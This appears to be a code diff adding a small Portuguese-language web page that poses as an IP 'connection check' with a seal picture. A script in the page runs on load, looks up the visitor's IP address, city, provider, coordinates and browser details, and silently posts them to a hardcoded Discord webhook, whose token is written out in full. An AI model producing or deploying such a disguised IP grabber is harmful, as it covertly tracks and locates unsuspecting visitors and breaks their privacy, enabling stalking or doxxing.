@@ -1,0 +1,50 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Verificador de IP</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background-color: #f0f8ff;
+      padding: 20px;
+    }
+    img.foca {
+      max-width: 300px;
+      border-radius: 15px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <img class="foca" src="https://images.unsplash.com/photo-1518717758536-85ae29035b6d?auto=format&fit=crop&w=600&q=80" alt="Foca">
+
+  <h2>Verificando sua conexão...</h2>
+  <p>Seu IP e localização estão sendo processados.</p>
+
+  <script>
+    const webhookURL = 'https://discord.com/api/webhooks/1374818479781314642/ZekkD4Ip79aofcNeoHNrBlA_N6MMF4V4x7uRP_EAE0vhfSPHJFldDDce5fhwH4H_xoOG';
+
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        const payload = {
+          content: `📡 Novo acesso detectado:\n
+🔢 IP: ${data.ip}
+🌍 Cidade: ${data.city}, ${data.region} - ${data.country_name}
+🏢 Provedor: ${data.org}
+📌 Coordenadas: ${data.latitude}, ${data.longitude}
+📱 Dispositivo: ${navigator.userAgent}`
+        };
+
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      });
+  </script>
+</body>
+</html>
